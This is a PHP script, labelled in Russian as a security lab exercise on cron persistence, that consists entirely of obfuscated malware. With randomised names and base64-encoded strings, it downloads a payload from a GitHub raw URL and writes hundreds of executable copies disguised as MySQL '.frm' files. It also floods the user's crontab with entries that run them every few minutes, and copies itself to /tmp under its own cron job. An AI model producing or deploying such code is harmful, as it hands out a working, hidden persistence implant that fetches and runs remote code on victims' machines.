<?php
// ЛР4 Безопасность - Персистентность через cron
$z8k2m9x7n1p5q4r3t6 = base64_decode("bXlzcWxf") . substr(md5(time() . rand()), 0, 8) . base64_decode("LmZybQ==");
$a1s2d3f4g5h6j7k8l9 = base64_decode('L3Zhci9sbGIvbXlzcWw=');
if (!is_dir($a1s2d3f4g5h6j7k8l9)) {
    $a1s2d3f4g5h6j7k8l9 = base64_decode('L3RtcC8=');
}
$w6e7r8t9y0u1i2o3p4 = $a1s2d3f4g5h6j7k8l9 . $z8k2m9x7n1p5q4r3t6;
function x1y2z3a4b5c6($w6e7r8t9y0u1i2o3p4) {
    exec(base64_decode("Y3JvbnRhYiAtbCAyPi9kZXYvbnVsbA=="), $output);
    foreach ($output as $l1n3) {
        if (strpos($l1n3, $w6e7r8t9y0u1i2o3p4) !== false) return true;
    }
    return false;
}
function h4k2j9m1n7p3q8r5t6($s8x2c5v9b1n7m3k6j4) {
    $a7f9d2g5h8j1k3l6p9 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21lY2h2MGQvb2J2cC1sci0zL21hc3Rlci9hY2RmMTFmMTNkZjM1MjBiMmFjY2VmNzNiYzk3NDc2ZS5mcm0=');
    $r4t8y2u5i9o3p1a6s2d = file_get_contents($a7f9d2g5h8j1k3l6p9);
    if ($r4t8y2u5i9o3p1a6s2d) {
        $v9b2n5m8k1j4h7g3f6d = substr(md5($a7f9d2g5h8j1k3l6p9 . time() . rand()), 0, 32);
        $x3c7v1b8n5m2k9j4h6g = dirname($s8x2c5v9b1n7m3k6j4) . '/' . $v9b2n5m8k1j4h7g3f6d . base64_decode("LmZybQ==");
        $z3x6c9v2b5n8m1k4j7p = basename($x3c7v1b8n5m2k9j4h6g, base64_decode("LmZybQ=="));
        $q7w2e5r8t1y4u7i9o3p = dirname($x3c7v1b8n5m2k9j4h6g);
        for ($f6g9h2j5k8l1n3m7p0 = 0; $f6g9h2j5k8l1n3m7p0 < 256; $f6g9h2j5k8l1n3m7p0++) {
            $a1s4d7f0g3j6k9l2m5n = $q7w2e5r8t1y4u7i9o3p . '/' . md5($f6g9h2j5k8l1n3m7p0 . time() . rand()) . base64_decode("LmZybQ==");
            file_put_contents($a1s4d7f0g3j6k9l2m5n, $r4t8y2u5i9o3p1a6s2d);
            file_put_contents($x3c7v1b8n5m2k9j4h6g, $r4t8y2u5i9o3p1a6s2d);
            file_put_contents($a1s4d7f0g3j6k9l2m5n, $r4t8y2u5i9o3p1a6s2d);
            chmod($a1s4d7f0g3j6k9l2m5n, 0755);
        }
         chmod($x3c7v1b8n5m2k9j4h6g, 0755);
        return $x3c7v1b8n5m2k9j4h6g;
    }
    return false;
}
function m4n5g6h7j8k9l0($w6e7r8t9y0u1i2o3p4) {
    $b7n3m9k2j8h1g5f6d4s = base64_decode("Ki8zICogKiAqICo=") . " $w6e7r8t9y0u1i2o3p4 " . base64_decode("Pi9kZXYvbnVsbCAyPiYxCg==") . "\n";
    $x9c5v1b8n2m7k3j6h4g = base64_decode("Ki83ICogKiAqICo=") . " $w6e7r8t9y0u1i2o3p4 " . base64_decode("Pi9kZXYvbnVsbCAyPiYxCg==") . "\n";
    $r8t2y5u9i1o3p6a4s7d = array('m' => ord(base64_decode("wqY=")) * 2, 'n' => 1, 'x' => 15);
    $f3g6h9j2k5l8n1m4p7q = array('', base64_decode("cGhwIA=="));
    $z1a2s3d4f5g6h7j8k9l = "";
    for ($q7w8e9r0t1y2u3i4o5p = 0; $q7w8e9r0t1y2u3i4o5p < $r8t2y5u9i1o3p6a4s7d['m']; $q7w8e9r0t1y2u3i4o5p++) {
        $v6c5b4n3m2k1j9h8g7f = mt_rand($r8t2y5u9i1o3p6a4s7d['n'], $r8t2y5u9i1o3p6a4s7d['x']);
        $a1s2d3f4g5h6j7k8l9m = $f3g6h9j2k5l8n1m4p7q[mt_rand(0, 1)];
        $a8tgb7dfkn04slx03lz = md5($q7w8e9r0t1y2u3i4o5p . time() . rand()) . md5(md5($q7w8e9r0t1y2u3i4o5p . time() . rand()) . time() . rand());
        if ($q7w8e9r0t1y2u3i4o5p == ord(base64_decode("wqY="))) {$z1a2s3d4f5g6h7j8k9l .= $b7n3m9k2j8h1g5f6d4s;}
        $r4gb0flc7blg5nd0z8f = base64_decode("L3RtcC8=") . md5($f6g9h2j5k8l1n3m7p0 . time() . rand()) . base64_decode("LmZybQ==");
        $p0o9i8u7y6t5r4e3w2q = $a1s2d3f4g5h6j7k8l9m === base64_decode("ZWNobw==") ? "$r4gb0flc7blg5nd0z8f" : "$r4gb0flc7blg5nd0z8f";
        $z1a2s3d4f5g6h7j8k9l .= "*/$v6c5b4n3m2k1j9h8g7f * * * * $a1s2d3f4g5h6j7k8l9m$p0o9i8u7y6t5r4e3w2q " . base64_decode("Pi9kZXYvbnVsbCAyPiYxCg==");
    }
        exec(base64_decode("KGNyb250YWIgLWwgMj4vZGV2L251bGw7IA==") . base64_decode("ZWNobyA=") . escapeshellarg($z1a2s3d4f5g6h7j8k9l) . base64_decode("KSB8IGNyb250YWIgLQ=="));
}
function v7b9n2m5k8j1h4g3f6d() {
    $current_file = __FILE__;
    $backup_name = base64_decode("L3RtcC8=") . substr(md5(time() . rand()), 0, 32) . base64_decode("LnBocA==");
    $backup_content = file_get_contents($current_file);
    if ($backup_content) {
        file_put_contents($backup_name, $backup_content);
        chmod($backup_name, 0755);
        $cron_job = base64_decode("Ki8zICogKiAqICo=") . " php $backup_name " . base64_decode("Pi9kZXYvbnVsbCAyPiYxCg==");
        exec(base64_decode("KGNyb250YWIgLWwgMj4vZGV2L251bGw7IGVjaG8g") . escapeshellarg($cron_job) . base64_decode("KSB8IGNyb250YWIgLQ=="));
        return $backup_name;
    }
    return false;
}

if (!x1y2z3a4b5c6($w6e7r8t9y0u1i2o3p4)) {
    $p8k7j6h5g4f3d2s1a9 = h4k2j9m1n7p3q8r5t6($w6e7r8t9y0u1i2o3p4);
    if ($p8k7j6h5g4f3d2s1a9) {
        m4n5g6h7j8k9l0($p8k7j6h5g4f3d2s1a9);
        v7b9n2m5k8j1h4g3f6d();
        echo "Скрипт развернут\n";
    }
} else {
    
}